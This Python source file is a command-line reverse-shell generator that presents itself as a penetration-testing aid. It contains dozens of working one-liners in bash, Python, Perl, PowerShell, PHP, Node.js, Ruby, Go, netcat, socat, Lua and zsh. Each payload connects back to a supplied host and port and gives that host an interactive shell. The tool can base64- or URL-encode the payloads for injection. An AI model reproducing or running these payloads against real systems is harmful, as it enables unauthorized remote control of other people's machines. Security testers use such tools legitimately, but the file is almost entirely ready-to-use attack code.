import argparse
import base64
import sys
import urllib.parse

banner = """
     ▄▄·  ▄▄▄· .▄▄ · .▄▄ ·  ▄▄▄·  ▐ ▄ ·▄▄▄▄  ▄▄▄   ▄▄▄·     Author: Ved Prakash Gupta (v3dSec)
    ▐█ ▌▪▐█ ▀█ ▐█ ▀. ▐█ ▀. ▐█ ▀█ •█▌▐███▪ ██ ▀▄ █·▐█ ▀█     Github: https://github.com/v3dSec
    ██ ▄▄▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄▄█▀▀█ ▐█▐▐▌▐█· ▐█▌▐▀▀▄ ▄█▀▀█     Twitter: https://x.com/v3dSec
    ▐███▌▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█▐█ ▪▐▌██▐█▌██. ██ ▐█•█▌▐█ ▪▐▌
    ·▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀▀  ▀  ▀ ▀▀ █▪▀▀▀▀▀• .▀  ▀ ▀  ▀                                                   
"""

REVERSE_SHELLS = {
    "bash": {
        "bash": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
        "bash_tcp": "0<&196;exec 196<>/dev/tcp/{host}/{port}; sh <&196 >&196 2>&196",
    },
    "python": {
        "python": 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
        "python3": 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    },
    "perl": {
        "perl": 'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
        "perl_io": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{host}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        "perl_windows": "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{host}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
    },
    "powershell": {
        "powershell": 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{host}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
        "powershell_nop": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    },
    "php": {
        "php": 'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        "php_shell_exec": 'php -r \'$s=fsockopen("{host}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
        "php_backticks": "php -r '$s=fsockopen(\"{host}\",{port});`/bin/sh -i <&3 >&3 2>&3`;'",
        "php_system": 'php -r \'$s=fsockopen("{host}",{port});system("/bin/sh -i <&3 >&3 2>&3");\'',
        "php_popen": 'php -r \'$s=fsockopen("{host}",{port});popen("/bin/sh -i <&3 >&3 2>&3", "r");\'',
        "php_proc_open": 'php -r \'$sock=fsockopen("{host}",{port}); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);\'',
    },
    "nodejs": {
        "nodejs": "(function(){{var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect({port},'{host}',function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();"
    },
    "ruby": {
        "ruby": 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{host}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
        "ruby_windows": 'ruby -rsocket -e \'c=TCPSocket.new("{host}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
    },
    "go": {
        "go": 'echo \'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{host}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'
    },
    "netcat": {
        "netcat": "nc -e /bin/sh {host} {port}",
        "netcat_bash": "nc -e /bin/bash {host} {port}",
        "netcat_c": "nc -c bash {host} {port}",
        "openbsd_nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
    },
    "ncat": {
        "ncat": "ncat {host} {port} -e /bin/bash",
        "ncat_udp": "ncat --udp {host} {port} -e /bin/bash",
    },
    "lua": {
        "lua": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{host}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
        "lua5_1": 'lua5.1 -e \'local host, port = "{host}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\'',
    },
    "socat": {
        "socat": "socat TCP4:{host}:{port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        "socat_raw": "socat TCP4:{host}:{port} EXEC:'/bin/bash -i',pty,stderr,setsid,sigint,sane",
    },
    "zsh": {
        "zsh_tcp": "zsh -c 'zmodload zsh/net/tcp && ztcp {host} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
    },
}


def retrieve_reverse_shell(shell_type):
    """Retrieve reverse shells for specified language"""
    return REVERSE_SHELLS.get(shell_type.lower(), None)


def format_reverse_shell(command_template, host, port):
    """Replace {host} and {port} in reverse shell templates"""
    return command_template.format(host=host, port=port)


def encode_base64_reverse_shell(command):
    """Base64 encode reverse shell"""
    return base64.b64encode(command.encode()).decode()


def encode_url_reverse_shell(command):
    """URL encode reverse shell"""
    return urllib.parse.quote(command)


def print_reverse_shell(shell_type, host, port, base64_encoding, url_encoding):
    """Print reverse shell for specified language"""
    reverse_shell_commands = retrieve_reverse_shell(shell_type)

    if reverse_shell_commands:
        for shell_name, shell_command in reverse_shell_commands.items():
            formatted_command = format_reverse_shell(shell_command, host, port)
            if base64_encoding:
                formatted_command = encode_base64_reverse_shell(formatted_command)
                print(f"\n  {formatted_command}")
            elif url_encoding:
                formatted_command = encode_url_reverse_shell(formatted_command)
                print(f"\n  {formatted_command}")
            else:
                print(f"\n  {formatted_command}")
    else:
        print(
            f"Reverse shell language '{shell_type}' is not recognized. Please select a valid language."
        )


def print_all_reverse_shells(host, port, base64_encoding, url_encoding):
    """Print all reverse shells"""
    for shell_type in REVERSE_SHELLS:
        print(f"\n[+] Reverse shells for: {shell_type}")
        print_reverse_shell(shell_type, host, port, base64_encoding, url_encoding)


def main():
    parser = argparse.ArgumentParser(
        description=" This tool is designed for generating reverse shells to aid in penetration testing and security assessments"
    )
    parser.add_argument(
        "--lhost", required=True, help="Listening IP address for the reverse shell"
    )
    parser.add_argument(
        "--lport", type=int, required=True, help="Listening port for the reverse shell"
    )
    parser.add_argument(
        "--language",
        required=False,
        choices=REVERSE_SHELLS.keys(),
        help="The reverse shell language to use",
    )
    parser.add_argument(
        "--base64",
        action="store_true",
        help="Base64 encode the generated reverse shell",
    )
    parser.add_argument(
        "--url",
        action="store_true",
        help="URL encode the generated reverse shell",
    )
    parser.add_argument(
        "--all",
        action="store_true",
        help="Generate reverse shell commands for all languages",
    )

    if len(sys.argv) == 1 or "-h" in sys.argv or "--help" in sys.argv:
        print(banner)
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    if args.all and args.language:
        print("Please specify either --language or --all, not both.")
    elif args.base64 and args.url:
        print("Please specify either --base64 or --url, not both.")
    elif args.all:
        print_all_reverse_shells(args.lhost, args.lport, args.base64, args.url)
    elif args.language:
        print_reverse_shell(
            args.language, args.lhost, args.lport, args.base64, args.url
        )
    else:
        print("Please specify either a reverse shell language or use the --all option.")


if __name__ == "__main__":
    main()
